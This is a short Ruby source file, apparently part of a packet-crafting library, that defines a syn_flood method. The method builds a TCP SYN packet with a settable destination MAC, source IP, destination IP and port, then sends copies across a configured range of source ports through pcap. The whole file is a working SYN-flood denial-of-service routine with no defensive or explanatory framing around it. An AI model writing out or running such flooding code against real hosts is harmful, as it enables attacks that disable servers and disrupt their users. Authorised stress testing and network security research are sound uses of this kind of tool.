require_relative '../../protocol/tcp_pac.rb'
class TCPP
	def self.syn_flood(pcap, options)

		dst_mac = options[:DST_MAC] || ""
		src_ip = options[:SRC_IP] || ""
		dst_ip = options[:DST_IP] || ""
		dst_port = options[:DST_PORT] || 0

		syn_pac = TCPP.syn_pac{|sp|
			sp.etherh.dst_mac = dst_mac
			sp.ipv4h.src_addr = src_ip
			sp.ipv4h.dst_addr = dst_ip
			sp.tcph.dst_port = dst_port
		}
		CONFIG[:port_range].each do|i|
			syn_pac = TCPP.pac_from_pac(syn_pac) do |pac|
				syn_pac.tcph.src_port = i
			end
			pcap.send_packet(syn_pac)
		end
	end
end